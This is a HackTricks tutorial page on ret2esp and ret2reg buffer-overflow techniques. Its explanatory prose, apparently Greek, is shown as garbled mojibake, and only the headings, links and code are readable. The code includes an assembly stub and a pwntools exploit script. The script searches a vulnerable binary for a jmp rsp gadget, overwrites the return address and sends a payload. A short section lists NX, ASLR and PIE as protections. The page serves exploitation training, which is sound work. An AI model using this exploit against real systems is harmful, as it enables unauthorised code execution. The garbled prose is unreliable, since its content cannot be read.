# Ret2esp / Ret2reg

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **Ret2esp**

**Î•Ï€ÎµÎ¹Î´Î® Î¿ ESP (Î”ÎµÎ¯ÎºÏ„Î·Ï‚ Î£Ï„Î¿Î¯Î²Î±Ï‚) Î´ÎµÎ¯Ï‡Î½ÎµÎ¹ Ï€Î¬Î½Ï„Î± ÏƒÏ„Î·Î½ ÎºÎ¿ÏÏ…Ï†Î® Ï„Î·Ï‚ ÏƒÏ„Î¿Î¯Î²Î±Ï‚**, Î±Ï…Ï„Î® Î· Ï„ÎµÏ‡Î½Î¹ÎºÎ® Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î¬Î½ÎµÎ¹ Ï„Î·Î½ Î±Î½Ï„Î¹ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ· Ï„Î¿Ï… EIP (Î”ÎµÎ¯ÎºÏ„Î·Ï‚ Î•Î½Ï„Î¿Î»ÏÎ½) Î¼Îµ Ï„Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· Î¼Î¹Î±Ï‚ **`jmp esp`** Î® **`call esp`** ÎµÎ½Ï„Î¿Î»Î®Ï‚. ÎšÎ¬Î½Î¿Î½Ï„Î±Ï‚ Î±Ï…Ï„ÏŒ, Î¿ ÎºÏÎ´Î¹ÎºÎ±Ï‚ shell Ï„Î¿Ï€Î¿Î¸ÎµÏ„ÎµÎ¯Ï„Î±Î¹ Î±ÎºÏÎ¹Î²ÏÏ‚ Î¼ÎµÏ„Î¬ Ï„Î·Î½ Î±Î½Ï„Î¹ÎºÎ±Ï„ÎµÏƒÏ„Î·Î¼Î­Î½Î· EIP. ÎŒÏ„Î±Î½ ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹ Î· ÎµÎ½Ï„Î¿Î»Î® `ret`, Î¿ ESP Î´ÎµÎ¯Ï‡Î½ÎµÎ¹ ÏƒÏ„Î·Î½ ÎµÏ€ÏŒÎ¼ÎµÎ½Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ·, Î±ÎºÏÎ¹Î²ÏÏ‚ ÎµÎºÎµÎ¯ Ï€Î¿Ï… ÎµÎ¯Î½Î±Î¹ Î±Ï€Î¿Î¸Î·ÎºÎµÏ…Î¼Î­Î½Î¿Ï‚ Î¿ ÎºÏÎ´Î¹ÎºÎ±Ï‚ shell.

Î‘Î½ **Î· Î¤Ï…Ï‡Î±Î¯Î± Î”Î¹Î¬Ï„Î±Î¾Î· Î§ÏÏÎ¿Ï… Î”Î¹ÎµÏ…Î¸ÏÎ½ÏƒÎµÏ‰Î½ (ASLR)** Î´ÎµÎ½ ÎµÎ¯Î½Î±Î¹ ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î· ÏƒÏ„Î± Windows Î® Linux, ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸Î¿ÏÎ½ Î¿Î¹ ÎµÎ½Ï„Î¿Î»Î­Ï‚ `jmp esp` Î® `call esp` Ï€Î¿Ï… Î²ÏÎ¯ÏƒÎºÎ¿Î½Ï„Î±Î¹ ÏƒÎµ ÎºÎ¿Î¹Î½Î­Ï‚ Î²Î¹Î²Î»Î¹Î¿Î¸Î®ÎºÎµÏ‚. Î©ÏƒÏ„ÏŒÏƒÎ¿, Î¼Îµ ÎµÎ½ÎµÏÎ³ÏŒ [**ASLR**](../common-binary-protections-and-bypasses/aslr/), Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï‡ÏÎµÎ¹Î±ÏƒÏ„ÎµÎ¯ Î½Î± Î±Î½Î±Î¶Î·Ï„Î®ÏƒÎµÏ„Îµ Î±Ï…Ï„Î­Ï‚ Ï„Î¹Ï‚ ÎµÎ½Ï„Î¿Î»Î­Ï‚ Î¼Î­ÏƒÎ± ÏƒÏ„Î¿ ÎµÏ…Î¬Î»Ï‰Ï„Î¿ Ï€ÏÏŒÎ³ÏÎ±Î¼Î¼Î± (ÎºÎ±Î¹ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï‡ÏÎµÎ¹Î±ÏƒÏ„ÎµÎ¯ Î½Î± Î½Î¹ÎºÎ®ÏƒÎµÏ„Îµ [**PIE**](../common-binary-protections-and-bypasses/pie/)).

Î•Ï€Î¹Ï€Î»Î­Î¿Î½, Î· Î´Ï…Î½Î±Ï„ÏŒÏ„Î·Ï„Î± Ï„Î¿Ï€Î¿Î¸Î­Ï„Î·ÏƒÎ·Ï‚ Ï„Î¿Ï… ÎºÏÎ´Î¹ÎºÎ± shell **Î¼ÎµÏ„Î¬ Ï„Î·Î½ ÎºÎ±Ï„Î±ÏƒÏ„ÏÎ¿Ï†Î® Ï„Î¿Ï… EIP**, Î±Î½Ï„Î¯ Î½Î± ÎµÎ¯Î½Î±Î¹ ÏƒÏ„Î· Î¼Î­ÏƒÎ· Ï„Î·Ï‚ ÏƒÏ„Î¿Î¯Î²Î±Ï‚, Î´Î¹Î±ÏƒÏ†Î±Î»Î¯Î¶ÎµÎ¹ ÏŒÏ„Î¹ Î¿Ï€Î¿Î¹ÎµÏƒÎ´Î®Ï€Î¿Ï„Îµ ÎµÎ½Ï„Î¿Î»Î­Ï‚ `push` Î® `pop` Ï€Î¿Ï… ÎµÎºÏ„ÎµÎ»Î¿ÏÎ½Ï„Î±Î¹ ÎºÎ±Ï„Î¬ Ï„Î· Î´Î¹Î¬ÏÎºÎµÎ¹Î± Ï„Î·Ï‚ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î±Ï‚ Ï„Î·Ï‚ ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ·Ï‚ Î´ÎµÎ½ Î¸Î± Ï€Î±ÏÎµÎ¼Î²Î±Î¯Î½Î¿Ï…Î½ ÏƒÏ„Î¿Î½ ÎºÏÎ´Î¹ÎºÎ± shell. Î‘Ï…Ï„Î® Î· Ï€Î±ÏÎ­Î¼Î²Î±ÏƒÎ· Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± ÏƒÏ…Î¼Î²ÎµÎ¯ Î±Î½ Î¿ ÎºÏÎ´Î¹ÎºÎ±Ï‚ shell Ï„Î¿Ï€Î¿Î¸ÎµÏ„Î¿ÏÎ½Ï„Î±Î½ ÏƒÏ„Î· Î¼Î­ÏƒÎ· Ï„Î·Ï‚ ÏƒÏ„Î¿Î¯Î²Î±Ï‚ Ï„Î·Ï‚ ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ·Ï‚.

### Lacking space

Î‘Î½ ÏƒÎ±Ï‚ Î»ÎµÎ¯Ï€ÎµÎ¹ Ï‡ÏÏÎ¿Ï‚ Î³Î¹Î± Î½Î± Î³ÏÎ¬ÏˆÎµÏ„Îµ Î¼ÎµÏ„Î¬ Ï„Î·Î½ Î±Î½Ï„Î¹ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ· Ï„Î¿Ï… RIP (Î¯ÏƒÏ‰Ï‚ Î¼ÏŒÎ½Î¿ Î¼ÎµÏÎ¹ÎºÎ¬ bytes), Î³ÏÎ¬ÏˆÏ„Îµ Î­Î½Î±Î½ Î±ÏÏ‡Î¹ÎºÏŒ ÎºÏÎ´Î¹ÎºÎ± shell `jmp` ÏŒÏ€Ï‰Ï‚:
```armasm
sub rsp, 0x30
jmp rsp
```
ÎšÎ±Î¹ Î³ÏÎ¬ÏˆÏ„Îµ Ï„Î¿ shellcode Î½Ï‰ÏÎ¯Ï‚ ÏƒÏ„Î· ÏƒÏ„Î¿Î¯Î²Î±.

### Î Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±

ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î²ÏÎµÎ¯Ï„Îµ Î­Î½Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Î±Ï…Ï„Î®Ï‚ Ï„Î·Ï‚ Ï„ÎµÏ‡Î½Î¹ÎºÎ®Ï‚ ÏƒÏ„Î¿ [https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode/using-rsp](https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode/using-rsp) Î¼Îµ Î¼Î¹Î± Ï„ÎµÎ»Î¹ÎºÎ® ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ· ÏŒÏ€Ï‰Ï‚:
```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

jmp_rsp = next(elf.search(asm('jmp rsp')))

payload = b'A' * 120
payload += p64(jmp_rsp)
payload += asm('''
sub rsp, 10;
jmp rsp;
''')

pause()
p.sendlineafter('RSP!\n', payload)
p.interactive()
```
## Ret2reg

ÎŸÎ¼Î¿Î¯Ï‰Ï‚, Î±Î½ Î³Î½Ï‰ÏÎ¯Î¶Î¿Ï…Î¼Îµ ÏŒÏ„Î¹ Î¼Î¹Î± ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ· ÎµÏ€Î¹ÏƒÏ„ÏÎ­Ï†ÎµÎ¹ Ï„Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· ÏŒÏ€Î¿Ï… ÎµÎ¯Î½Î±Î¹ Î±Ï€Î¿Î¸Î·ÎºÎµÏ…Î¼Î­Î½Î¿ Ï„Î¿ shellcode, Î¼Ï€Î¿ÏÎ¿ÏÎ¼Îµ Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„Î¿ÏÎ¼Îµ Ï„Î¹Ï‚ ÎµÎ½Ï„Î¿Î»Î­Ï‚ **`call eax`** Î® **`jmp eax`** (Î³Î½Ï‰ÏƒÏ„Î­Ï‚ Ï‰Ï‚ Ï„ÎµÏ‡Î½Î¹ÎºÎ® **ret2eax**), Ï€ÏÎ¿ÏƒÏ†Î­ÏÎ¿Î½Ï„Î±Ï‚ Î¼Î¹Î± Î¬Î»Î»Î· Î¼Î­Î¸Î¿Î´Î¿ Î³Î¹Î± Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎ¿Ï…Î¼Îµ Ï„Î¿ shellcode Î¼Î±Ï‚. Î‘ÎºÏÎ¹Î²ÏÏ‚ ÏŒÏ€Ï‰Ï‚ Ï„Î¿ eax, **Î¿Ï€Î¿Î¹Î¿Î´Î®Ï€Î¿Ï„Îµ Î¬Î»Î»Î¿ ÎºÎ±Ï„Î±Ï‡Ï‰ÏÎ·Ï„Î®** Ï€Î¿Ï… Ï€ÎµÏÎ¹Î­Ï‡ÎµÎ¹ Î¼Î¹Î± ÎµÎ½Î´Î¹Î±Ï†Î­ÏÎ¿Ï…ÏƒÎ± Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ (**ret2reg**).

### Î Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±

ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î²ÏÎµÎ¯Ï„Îµ Î­Î½Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± ÎµÎ´Ï: [https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode/ret2reg/using-ret2reg](https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode/ret2reg/using-ret2reg)

## Î ÏÎ¿ÏƒÏ„Î±ÏƒÎ¯ÎµÏ‚

* [**NX**](../common-binary-protections-and-bypasses/no-exec-nx.md): Î‘Î½ Î· ÏƒÏ„Î¿Î¯Î²Î± Î´ÎµÎ½ ÎµÎ¯Î½Î±Î¹ ÎµÎºÏ„ÎµÎ»Î­ÏƒÎ¹Î¼Î·, Î±Ï…Ï„ÏŒ Î´ÎµÎ½ Î¸Î± Î²Î¿Î·Î¸Î®ÏƒÎµÎ¹ ÎºÎ±Î¸ÏÏ‚ Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Ï„Î¿Ï€Î¿Î¸ÎµÏ„Î®ÏƒÎ¿Ï…Î¼Îµ Ï„Î¿ shellcode ÏƒÏ„Î· ÏƒÏ„Î¿Î¯Î²Î± ÎºÎ±Î¹ Î½Î± ÎºÎ¬Î½Î¿Ï…Î¼Îµ jump Î³Î¹Î± Î½Î± Ï„Î¿ ÎµÎºÏ„ÎµÎ»Î­ÏƒÎ¿Ï…Î¼Îµ.
* [**ASLR**](../common-binary-protections-and-bypasses/aslr/) & [**PIE**](../common-binary-protections-and-bypasses/pie/): Î‘Ï…Ï„Î¬ Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± ÎºÎ¬Î½Î¿Ï…Î½ Ï€Î¹Î¿ Î´ÏÏƒÎºÎ¿Î»Î· Ï„Î·Î½ ÎµÏÏÎµÏƒÎ· Î¼Î¹Î±Ï‚ ÎµÎ½Ï„Î¿Î»Î®Ï‚ Î³Î¹Î± Î½Î± ÎºÎ¬Î½Î¿Ï…Î¼Îµ jump ÏƒÎµ esp Î® Î¿Ï€Î¿Î¹Î¿Î½Î´Î®Ï€Î¿Ï„Îµ Î¬Î»Î»Î¿ ÎºÎ±Ï„Î±Ï‡Ï‰ÏÎ·Ï„Î®.

## Î‘Î½Î±Ï†Î¿ÏÎ­Ï‚

* [https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode](https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode)
* [https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode/using-rsp](https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode/using-rsp)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
